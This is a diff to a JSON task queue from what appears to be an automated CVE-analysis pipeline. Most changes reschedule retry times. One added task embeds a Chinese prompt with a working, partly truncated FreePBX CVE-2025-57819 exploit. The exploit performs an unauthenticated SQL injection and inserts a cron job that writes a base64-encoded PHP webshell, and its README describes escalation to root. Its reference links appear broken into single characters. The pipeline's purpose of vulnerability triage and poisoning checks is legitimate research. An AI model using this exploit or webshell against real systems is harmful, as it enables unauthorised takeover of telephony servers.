@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788647393.8039744,
     "last_attempt": 1788720326.0247023,
-    "next_attempt": 1788720368.9943457,
+    "next_attempt": 1788728265.8630135,
     "metadata": {},
     "task_id": "task_CVE-2026-24061_1788647393",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788647399.5206115,
     "last_attempt": 1788720319.5429978,
-    "next_attempt": 1788720355.8189945,
+    "next_attempt": 1788728273.416399,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1788647399",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788654262.037554,
     "last_attempt": 1788720326.0269048,
-    "next_attempt": 1788720365.2056713,
+    "next_attempt": 1788728278.845093,
     "metadata": {},
     "task_id": "task_CVE-2026-73570_1788654262",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788654267.2556424,
     "last_attempt": 1788720321.0198317,
-    "next_attempt": 1788720361.719681,
+    "next_attempt": 1788728280.0557413,
     "metadata": {},
     "task_id": "task_CVE-2026-27876_1788654267",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788671970.8721983,
     "last_attempt": 1788720326.028876,
-    "next_attempt": 1788720371.0258825,
+    "next_attempt": 1788728278.0159779,
     "metadata": {},
     "task_id": "task_CVE-2026-82222_1788671970",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788700841.5401418,
     "last_attempt": 1788720313.443696,
-    "next_attempt": 1788720333.385526,
+    "next_attempt": 1788728253.288512,
     "metadata": {},
     "task_id": "task_CVE-2026-19949_1788700841",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788720302.4976103,
     "last_attempt": 1788720319.544355,
-    "next_attempt": 1788720342.0317447,
+    "next_attempt": 1788728250.7850933,
     "metadata": {},
     "task_id": "task_CVE-2026-39866_1788720302",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788720308.4376392,
     "last_attempt": 1788720326.0322115,
-    "next_attempt": 1788720347.7008755,
+    "next_attempt": 1788728256.0187633,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1788720308",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788720314.5398724,
     "last_attempt": 1788720319.5480256,
-    "next_attempt": 1788720327.671195,
+    "next_attempt": 1788728242.693455,
     "metadata": {},
     "task_id": "task_CVE-2026-20841_1788720314",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1788720321.0170097,
     "last_attempt": 1788720326.0332992,
-    "next_attempt": 1788720335.1351855,
+    "next_attempt": 1788728244.4923038,
     "metadata": {},
     "task_id": "task_CVE-2025-68921_1788720321",
     "required_result_fields": [
@@ -300,9 +300,38 @@
     "last_error": null,
     "created_at": 1788720326.7333236,
     "last_attempt": 0,
-    "next_attempt": 1788720331.67735,
+    "next_attempt": 1788728239.6236854,
     "metadata": {},
     "task_id": "task_CVE-2025-32463_1788720326",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2025-57819",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2025-57819\", \"sources\": [\"NVD\", \"CISA\", \"OSCS\"], \"descriptions\": [\"FreePBX is an open-source web-based graphical user interface. FreePBX 15, 16, and 17 endpoints are vulnerable due to insufficiently sanitized user-supplied data allowing unauthenticated access to FreePBX Administrator leading to arbitrary database manipulation and remote code execution. This issue has been patched in endpoint versions 15.0.66, 16.0.89, and 17.0.3.\", \"\\u6807\\u9898: FreePBX Pre-Auth SQL\\u6ce8\\u5165RCE\"], \"published_date\": \"2025-08-28T17:15:36.790\", \"last_modified_date\": \"2026-06-17T15:45:07.083\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"o\", \"m\", \"m\", \"u\", \"n\", \"i\", \"t\", \"y\", \".\", \"f\", \"r\", \"e\", \"e\", \"p\", \"b\", \"x\", \".\", \"o\", \"r\", \"g\", \"/\", \"t\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"y\", \"-\", \"p\", \"l\", \"e\", \"a\", \"s\", \"e\", \"-\", \"l\", \"o\", \"c\", \"k\", \"-\", \"d\", \"o\", \"w\", \"n\", \"-\", \"y\", \"o\", \"u\", \"r\", \"-\", \"a\", \"d\", \"m\", \"i\", \"n\", \"i\", \"s\", \"t\", \"r\", \"a\", \"t\", \"o\", \"r\", \"-\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \"/\", \"1\", \"0\", \"7\", \"2\", \"0\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"F\", \"r\", \"e\", \"e\", \"P\", \"B\", \"X\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"r\", \"e\", \"p\", \"o\", \"r\", \"t\", \"i\", \"n\", \"g\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"G\", \"H\", \"S\", \"A\", \"-\", \"m\", \"4\", \"2\", \"g\", \"-\", \"x\", \"g\", \"4\", \"c\", \"-\", \"5\", \"f\", \"3\", \"h\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"w\", \"a\", \"t\", \"c\", \"h\", \"t\", \"o\", \"w\", \"r\", \"l\", \"a\", \"b\", \"s\", \"/\", \"w\", \"a\", \"t\", \"c\", \"h\", \"T\", \"o\", \"w\", \"r\", \"-\", \"v\", \"s\", \"-\", \"F\", \"r\", \"e\", \"e\", \"P\", \"B\", \"X\", \"-\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"7\", \"8\", \"1\", \"9\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"5\", \"-\", \"5\", \"7\", \"8\", \"1\", \"9\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - ImBIOS/lab-cve-2025-57819: FreePBX CVE-2025-57819 lab (Docker ...\n [description] (Work in Progress) FreePBX CVE-2025-57819 Lab - Unauth SQLi → RCE Chain (Nuclei POC) Spin up a reproducible FreePBX 15 lab (Docker) to validate CVE-2025-57819 — a critical unauthenticated SQL injection in userman AJAX endpoints that can be chained to RCE.\n [link] https://github.com/ImBIOS/lab-cve-2025-57819\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2025-57819 - Unauthenticated Remote Code Execution in…\n [description] CVE-2025-57819_FreePBX This repository contains a Proof of Concept (PoC) exploit for CVE-2025-57819, a critical remote code execution vulnerability affecting FreePBX versions 15x, 16x, and 17x\n [link] https://vulmon.com/vulnerabilitydetails?qid=CVE-2025-57819\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2025-57819 - vulnerability database | Vulners.com\n [description] FreePBX CVE-2025-57819 is an unauthenticated SQL injection leading to remote code execution in FreePBX 15.x, 16.x, and 17.x. Reports and PoCs describe exploitation via vulnerable endpoints (notably /admin/ajax.php and userman-related paths) enabli...\n [link] https://vulners.com/cve/CVE-2025-57819\n [webpage 2 end]\n[webpage 3 begin] [title] Exploit for CVE-2025-57819 - exploit database | Vulners.com\n [description] CVE-2025-57819-ioc-check Description CVE-2024-6387-ioc-check is a lightweight, efficient tool designed to identify IoCs on freepbx servers with any of `endpoint Users should upgrade to the latest supported versions of FreePBX (currently 15, 16, an...\n [link] https://vulners.com/githubexploit/1EEC8894-D2F7-547C-827C-915BE866875C\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2025-57819: Sangoma FreePBX RCE Vulnerability - SentinelOne\n [description] CVE-2025-57819 is a remote code execution vulnerability in Sangoma FreePBX. Learn about its impact, affected versions, and mitigation methods.\n [link] https://www.sentinelone.com/vulnerability-database/cve-2025-57819/\n [webpage 4 end]\n[webpage 5 begin] [title] 💀 Sangoma Freepbx — PoC exploit for CVE-2025-57819 by b4sh2 | Sploitus\n [description] June 7, 2026 - ## https://sploitus.com/exploi... → RCE One-shot exploit for the FreePBX **Endpoint Manager** unauthenticated SQL injection (CVE-2025-57819), chained into remote code execution via the FreePBX `cron_jobs` table...\n [link] https://sploitus.com/exploit?id=C6B5D6BD-CFEC-571A-B766-B82261AE3DD8\n [webpage 5 end]\n[webpage 6 begin] [title] CVE-2025-57819, FreePBX Pre-Auth RCE and the PBX Blast Radius\n [description] June 8, 2026 - One was creation of unexpected administrative users in ampusers. The other was insertion of scheduled jobs into cron_jobs, where a command field could later be executed by the PBX environment.\n [link] https://www.penligent.ai/hackinglabs/cve-2025-57819/\n [webpage 6 end]\n[webpage 7 begin] [title] GitHub - b4sh2/CVE-2025-57819-poc: CVE-2025-57819 -> rce · GitHub\n [description] One-shot exploit for the FreePBX Endpoint Manager unauthenticated SQL injection (CVE-2025-57819), chained into remote code execution via the FreePBX cron_jobs table.\n [link] https://github.com/b4sh2/CVE-2025-57819-poc\n [webpage 7 end]\n[webpage 8 begin] [title] Exploit Against FreePBX (CVE-2025-57819) with code execution.\n [description] October 7, 2025 - Most recently, a SQL injection vulnerability was found that allows attackers to modify the database.\n [link] https://isc.sans.edu/diary/32350\n [webpage 8 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/2bea678e090db2d058961c4f1f8d9a84/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 r3vpwnx\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/2bea678e090db2d058961c4f1f8d9a84/README.md\n---\n# CVE-2025-57819 - FreePBX 16 Endpoint Manager unauthenticated SQL injection to RCE\n\nUnauthenticated stacked SQL injection in the FreePBX Endpoint Manager module (admin/ajax.php, `brand` parameter), CVE-2025-57819, affecting FreePBX framework < 16.0.89. It is escalated to remote code execution by INSERTing a row into FreePBX's own `cron_jobs` table so the appliance cron runner writes an attacker webshell within ~60s (exec as the `asterisk` user).\n\n**CVE:** CVE-2025-57819\n\n## Requirements\n\n```bash\npython3 -m pip install requests    # for the Python PoC(s)\n```\n\n## Usage\n\n```bash\npython3 exploit.py <target> [--vhost <name>] [--root] [--cmd <shell cmd>]\n```\n\n## How it works\n\n1. Confirm the SQL injection\n2. Stacked query to webshell to RCE as `asterisk`\n3. Find the root primitive\n4. Escalate to root\n\n## References\n\n- https://github.com/itsC1SCO/FreePBX-SQLi-Exploit-Privilege-escalation\n\n## Disclaimer\n\nFor authorised security testing and education only. Only run this against\nsystems you own or have **explicit written permission** to test.\n\n---\nAuthor: **r3vpwnx**\n\n\n---\n/tmp/2bea678e090db2d058961c4f1f8d9a84/exploit.py\n---\n#!/usr/bin/env python3\n\"\"\"\nCVE-2025-57819 - FreePBX 16 Endpoint Manager unauthenticated SQL injection to RCE.\n\nChains the `brand` stacked-query injection on\n  admin/ajax.php?module=FreePBX\\\\modules\\\\endpoint\\\\ajax&command=model\ninto a PHP webshell by INSERTing a row into FreePBX's own `cron_jobs` table,\nwhich the appliance's cron runner executes within ~60s (RCE as `asterisk`).\n\nOptional --root uses an appliance-local privesc: /etc/incron.d/legacy makes\nroot run /etc/init.d/dahdi, which sources the asterisk-writable\n/etc/dahdi/init.conf.\n\n    ./exploit.py <target>\n    ./exploit.py <target> --vhost <name> --root\n    ./exploit.py <target> --cmd 'id'\n\nFor authorised security testing only. Only run this against systems you own or\nhave explicit written permission to test.  Author: r3vpwnx\n\"\"\"\nimport argparse\nimport sys\nimport time\nimport urllib.parse\n\nimport requests\nrequests.packages.urllib3.disable_warnings()  # noqa\n\nWEBSHELL_NAME = \"r3v.php\"\n# <?php system($_GET['cmd']); ?>\nWEBSHELL_B64 = \"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==\"\n\n\ndef _base(ip, vhost, scheme=\"https\"):\n    return f\"{scheme}://{ip}\", {\"Host\": vhost} if vhost else {}\n\n\ndef ajax(sess, base, host, brand):\n    q = {\n        \"module\": r\"FreePBX\\modules\\endpoint\\ajax\",\n        \"command\": \"model\", \"template\": \"x\", \"model\": \"model\", \"brand\": brand,\n    }\n    return sess.get(f\"{base}/admin/ajax.php\", params=q, headers=host,\n                    verify=False, timeout=20)\n\n\ndef confirm_sqli(sess, base, host):\n    payload = (\"x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -\")\n    r = ajax(sess, base, host, payload)\n    if \"XPATH syntax error\" in r.text and \"~\" in r.text:\n        leaked = r.text.split(\"~\")[1]\n        print(f\"[+] SQLi confirmed - DB user: {leaked}\")\n        return True\n    print(\"[-] SQLi not confirmed; response:\", r.text[:200])\n    return False\n\n\ndef drop_webshell(sess, base, host):\n    cmd = (f\"echo {WEBSHELL_B64}|base64 -d >/var/www/html/{WEBSHELL_NAME}\")\n    ins = (\n        \"x';INSERT INTO cron_jobs \"\n        \"(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) \"\n        f\"VALUES ('sysadmin','wt-{int(time.time())}','{cmd}',NULL,'* * * * *',30,1,1)-- -\"\n    )\n    ajax(sess, base, host, ins)          # returns 500, the INSERT still commits\n    print(\"[*] cron_jobs row inserted - waiting up to 90s for the cron runner...\")\n    shurl = f\"{base}/{WEBSHELL_NAME}\"\n    for _ in range(18):\n        time.sleep(5)\n        try:\n            r = sess.get(shurl, params={\"cmd\": \"id\"}, headers=host,\n                         verify=False, timeout=10)\n            if \"uid=\" in r.text:\n                print(f\"[+] webshell live: {shurl}\")\n                p\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 0,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": null,
+    "last_error": null,
+    "created_at": 1788728239.3055692,
+    "last_attempt": 0,
+    "next_attempt": 1788728244.1319556,
+    "metadata": {},
+    "task_id": "task_CVE-2025-57819_1788728239",
     "required_result_fields": [
       "poc_available",
       "condition",
